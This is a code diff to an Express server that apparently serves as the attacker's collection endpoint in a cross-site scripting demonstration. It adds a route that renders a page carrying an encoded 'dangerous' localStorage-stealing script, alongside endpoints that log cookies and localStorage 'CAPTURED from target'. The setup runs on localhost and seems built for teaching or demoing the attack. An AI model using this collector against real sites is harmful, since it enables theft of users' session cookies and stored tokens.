@@ -1,7 +1,7 @@
 import express from 'express'
 import config from './config'
 
-import { getDangerousScript } from '../utils/dangerous'
+import { getDangerousScript, getDangerousLocalStorageScript } from '../utils/dangerous'
 
 const hostname = 'localhost'
 
@@ -53,6 +53,17 @@ export function start(port: number) {
   app.post('/save-cookie', (req, res) => {
     console.log('CAPTURED cookie from target!')
     console.log(`Cookie: ${req.body.cookie}`)
+    console.log()
+    res.sendStatus(204)
+  })
+
+  app.get('/search-storage', (_req, res) => {
+    res.render('search-danger', { dangerousScript: encodeURIComponent(getDangerousLocalStorageScript(hostname, port)) })
+  })
+
+  app.post('/save-storage', (req, res) => {
+    console.log('CAPTURED local storage from target!')
+    console.log(`Storage: ${JSON.stringify(req.body)}`)
     console.log()
     res.sendStatus(204)
   })
